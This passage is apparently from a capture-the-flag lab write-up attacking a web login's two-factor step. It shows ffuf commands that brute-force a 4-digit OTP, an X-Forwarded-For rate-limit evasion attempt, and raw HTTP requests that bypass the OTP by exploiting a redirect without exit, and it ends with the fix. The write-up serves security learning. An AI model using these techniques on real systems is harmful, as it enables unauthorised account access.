## Step 3 — OTP Brute-Force (fails, by design)

I have seen in the module how to brute-force OTP. Lets say the OTP is 4 digits → 10 000 values. I generate the list, grab the **session cookie** + exact error string from Burp, and fuzz.

```bash
seq -w 0 9999 > tokens.txt          # -w zero-pads to equal length

ffuf -w ./tokens.txt -u http://X.X.X.X:PORT/2fa.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=23pojacv95pf5ba28thl8kdku7" -d "otp=FUZZ" -fr "Invalid OTP"
```

```
 :: Data             : otp=FUZZ
 :: Header           : Cookie: PHPSESSID=23pojacv95pf5ba28thl8kdku7
 :: Filter           : Regexp: Invalid OTP
________________________________________________

:: Progress: [10000/10000] :: Job [1/1] :: 1069 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

No hit (tried longer OTP lengths too → same). **Manual** testing reveals why:

```text
after 3 incorrect OTPs -> redirected to index.php
=> the session is invalidated after 3 tries, so the brute-force kills itself
```
I could have seen it directly from the very first three results of the ffuf run. 
I have also seen that there could be weak force-brute protection:

```text
# 1) rate-limit evasion via spoofed source IP (course technique)
X-Forwarded-For: <random>     -> header not honored, no effect

# 2) weak-token check: captured 3 session IDs, looked for pattern / encoding
23pojacv95pf5ba28thl8kdku7
h1vhcrpv95m0ae54if6f0uvcfr
tt68q3hthrqc4borr8j2cpu79t
-> no pattern, decoding gives nothing -> tokens seems solid
```

Force-brute does not seem to be the way to go, so I pivot to the auth bypass I learnt. 

---

## Step 4 — Auth Bypass via Direct Access (the win)


Taking back into account that I know the home-protected page is `profile.php`, I can try to access it directly with the **valid session cookie** I have from the login, but before the OTP is entered.  

In Burp I take the authenticated-but-pre-2FA request:

```http
POST /2fa.php HTTP/1.1
Host: X.X.X.X:PORT
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=h1vhcrpv95m0ae54if6f0uvcfr

otp=
```

…and **swap the endpoint** `2fa.php` → `profile.php`, keeping the same username_valid session cookie:

```http
POST /profile.php HTTP/1.1
Host: X.X.X.X:PORT
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=h1vhcrpv95m0ae54if6f0uvcfr

otp=
```

I intercept the **response**. It redirects to `/2fa.php` — but the body still contains the **fully rendered `profile.php`**. Bingo, it's the direct access method working. 

```http
HTTP/1.1 302 Found
Location: /2fa.php
Content-Length: 3647
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
...
<h1 class="display-5 title">Welcome username_valid!</h1>
...
HTB{XXXXXXXXXXX}
```

To view it rendered instead of reading raw, change the status line **`302 Found` → `200 OK`** in the intercepted response.

![Rendered admin/username_valid page after forcing 200 OK](Images/render-admin-page.png)

The OTP gate redirects but never stops execution, so the protected page is built *before* the redirect. Requesting `profile.php` directly with a half-authenticated session returns the goods in the 302 body. Classic "redirect without `exit`".

---

## Takeaways

- **Enumeration:** filter on response size or text message when the invalid-user message is a constant.
- **Password brute-force:** register first to learn the **policy**, then tailor the wordlist (length + char classes) → rockyou 14M down to a usable list.
- **OTP:** a 3-try lockout defeats brute-force → check for brute-force escape, but in this case,not working.
- **The win:** *redirect without `exit;`* — the 302 response body still leaks the protected page. Fix = `exit;` immediately after the `Location` header.
